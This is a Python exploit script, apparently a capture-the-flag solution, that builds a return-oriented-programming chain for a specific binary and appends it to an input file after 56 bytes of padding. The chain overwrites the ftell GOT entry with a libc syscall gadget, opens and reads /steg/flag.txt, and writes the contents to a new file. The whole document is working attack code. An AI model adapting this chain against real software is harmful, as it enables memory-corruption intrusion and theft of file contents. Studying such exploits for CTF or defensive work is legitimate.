import argparse
from pwn import *

#gadgets
pop_rax_rbx_rbp = 0x0045b1dd#: pop rax; pop rbx; pop rbp; ret;
mov_rax_prax_pop_rbp = 0x004569f8#: mov rax, [rax]; pop rbp; ret;
add_rax_rdx_pop_rbp = 0x00453801#: add rax, rdx; pop rbp; ret;
mov_eax_0_pop_rbp = 0x0044b118#: mov eax, 0; pop rbp; ret;
mov_eax_1_pop_rbp = 0x00454805#: mov eax, 1; pop rbp; ret;
pop_rdx = 0x0042cd0c#: pop rdx; ret;
pop_rdi = 0x0045b2fb#: pop rdi; ret;
pop_rsi = 0x0042e8b4#: pop rsi; ret;
mov_prdx_rax_pop_rbp = 0x00436bf9#: mov [rdx], rax; nop; pop rbp; ret;

gettext_offset_libc = 0x32040
gettext_got_entry   = 0x48a090
ftell_got_entry     = 0x48a018
syscall_offset_from_gettext = 0x116a47 - gettext_offset_libc#: syscall; ret;

jmp_syscall = 0x404030#JMP to ftell through GOT

OUTFILE_ADDR = 0x48a8f0
FLAG_TEXT_ADDR = 0x48ab00
OUTFILE_TEXT_ADDR = 0x48ab40
FLAG_CONTENT_ADDR = 0x48ab80

O_RDONLY = 0o00
O_RDWR = 0o02
O_CREAT = 0o100

def write_str_rop(s, addr):
    rop = b""
    rop += p64(pop_rdx)
    rop += p64(addr)
    rop += p64(pop_rax_rbx_rbp)
    rop += (s + 8 * b"\x00")[:8]#pad to 8 bytes
    rop += p64(0)
    rop += p64(0)
    rop += p64(mov_prdx_rax_pop_rbp)
    rop += p64(0)
    return rop

#For open we need to set RDI = filename, RAX = 2, RSI = flags (O_RDONLY or O_RDWR | O_CREAT), RDX = 0 (mode)
def open_rop(filename_addr, flags, mode = 0):
    rop = b""
    rop += p64(pop_rdi)
    rop += p64(filename_addr)
    rop += p64(pop_rax_rbx_rbp)
    rop += p64(2)#rax
    rop += p64(0)#rbx
    rop += p64(0)#rbp
    rop += p64(pop_rsi)
    rop += p64(flags)
    rop += p64(pop_rdx)
    rop += p64(mode)
    rop += p64(jmp_syscall)
    return rop

#Read is RDI = fd, RSI = dst, RDX = size, RAX = 0
#Write is just RAX = 1 and the rest is set the same way
#Just in read - RSI = dst, and in write RSI = src
def read_write_rop(rax, fd, addr):
    rop = b""
    rop += p64(pop_rdi)
    rop += p64(fd)
    rop += p64(pop_rsi)
    rop += p64(addr)
    rop += p64(pop_rdx)
    rop += p64(0x100)#No idea about size of flag so can go over
    if rax == 0:
        rop += p64(mov_eax_0_pop_rbp)
    else:
        rop += p64(mov_eax_1_pop_rbp)
    rop += p64(0)
    rop += p64(jmp_syscall)
    return rop

def read_rop(fd, dst_addr):
    return read_write_rop(0, fd, dst_addr)

def write_rop(fd, src_addr):
    return read_write_rop(1, fd, src_addr)

def install_syscall_gadget(addr):
    rop = b""
    rop += p64(pop_rax_rbx_rbp)
    rop += p64(gettext_got_entry)
    rop += p64(0)
    rop += p64(0)
    rop += p64(mov_rax_prax_pop_rbp)#now in rax we have gettext libc address
    rop += p64(0)

    rop += p64(pop_rdx)
    rop += p64(syscall_offset_from_gettext)
    rop += p64(add_rax_rdx_pop_rbp)#rax points to syscall gadget now
    rop += p64(0)

    rop += p64(pop_rdx)
    rop += p64(addr)
    rop += p64(mov_prdx_rax_pop_rbp)#With this we move our gadget into addr
    rop += p64(0)
    return rop

#Just setting RDI = exit code 0 (success) and RAX = 60
def exit_rop():
    rop = b""
    rop += p64(pop_rdi);
    rop += p64(0)
    rop += p64(pop_rax_rbx_rbp)
    rop += p64(60)
    rop += p64(0)
    rop += p64(0)
    rop += p64(jmp_syscall)
    return rop

def copy_outfile_addr(addr, offset = 0):
    rop = b""
    rop += p64(pop_rax_rbx_rbp)
    rop += p64(OUTFILE_ADDR)
    rop += p64(0)
    rop += p64(0)

    rop += p64(mov_rax_prax_pop_rbp)#now in rax we have addr of outfile string
    rop += p64(0)

    rop += p64(pop_rdx)
    rop += p64(offset) #Copy at offset
    rop += p64(add_rax_rdx_pop_rbp)
    rop += p64(0)

    rop += p64(mov_rax_prax_pop_rbp)#in RAX there are 8 bytes of outfile stored directly
    rop += p64(0)

    rop += p64(pop_rdx)
    rop += p64(addr + offset)
    rop += p64(mov_prdx_rax_pop_rbp)#With this we move our gadget into addr
    rop += p64(0)
    return rop

def rop(fd, offset = 0):
    rop = b""
    #As we are agoing with syscalls we need to get some good syscall gadget. Found some in libc but none in binary
    #We will calculate address of syscall gadget and install it in place of ftell function so we can call
    #it without problem

    rop += install_syscall_gadget(ftell_got_entry)

    rop += copy_outfile_addr(OUTFILE_TEXT_ADDR, offset = 0)
    rop += copy_outfile_addr(OUTFILE_TEXT_ADDR, offset = 8)
    rop += copy_outfile_addr(OUTFILE_TEXT_ADDR, offset = 16)
    rop += copy_outfile_addr(OUTFILE_TEXT_ADDR, offset = 24)
    rop += copy_outfile_addr(OUTFILE_TEXT_ADDR, offset = 32)

    rop += write_str_rop(b"/steg/fl", FLAG_TEXT_ADDR)
    rop += write_str_rop(b"ag.txt\x00", FLAG_TEXT_ADDR + 8)

    rop += open_rop(FLAG_TEXT_ADDR, O_RDONLY)
    rop += read_rop(fd, FLAG_CONTENT_ADDR)

    rop += open_rop(OUTFILE_TEXT_ADDR, O_RDWR | O_CREAT, 0o777)
    rop += write_rop(fd+1, FLAG_CONTENT_ADDR)

    rop += exit_rop()#For quitting cleanly as we cannot segfault or we fail
    print(f"Len of ropchain is {len(rop)} bytes")
    return rop

def main():
    parser= argparse.ArgumentParser("Pwn")
    parser.add_argument("filename", help="Original filename to attach payload to")
    parser.add_argument("--output", "-o", help="Output filename")
    parser.add_argument("--fd", type=int, default=5, help="First fd")
    args = parser.parse_args()

    content = b""
    with open(args.filename, "rb") as inp_file:
        content = inp_file.read()

    outfile_name = "pwn_" + args.filename

    if(args.output):
        outfile_name = args.output

    with open(outfile_name, "wb") as outfile:
        outfile.write(content)
        outfile.write(56 * b"A")#padding to RET
        outfile.write(rop(args.fd))

    print(f"Created file {outfile_name} with payload")

main()
